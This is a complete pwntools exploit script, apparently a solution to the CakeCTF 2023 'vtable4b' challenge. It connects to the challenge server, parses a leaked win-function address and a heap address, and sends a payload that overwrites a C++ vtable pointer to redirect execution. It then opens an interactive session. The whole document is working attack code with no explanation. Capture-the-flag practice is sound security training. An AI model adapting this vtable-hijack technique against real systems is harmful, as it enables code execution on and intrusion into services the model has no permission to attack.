from pwn import *

io = remote('vtable4b.2023.cakectf.com', '9000')
context.arch = 'amd64'

io.recvuntil(b'<win> =')
win = int(io.recvline(), 16)

io.sendline(b'3')
io.recvuntil(b'0x')
message_addr = int(b'0x' + io.recvline().split(b'|')[0], 16)
message_addr += 0x10

io.clean()
io.sendline(b'2')
payload = pack(win) * 4
payload += pack(message_addr)
io.sendline(payload)

io.interactive()
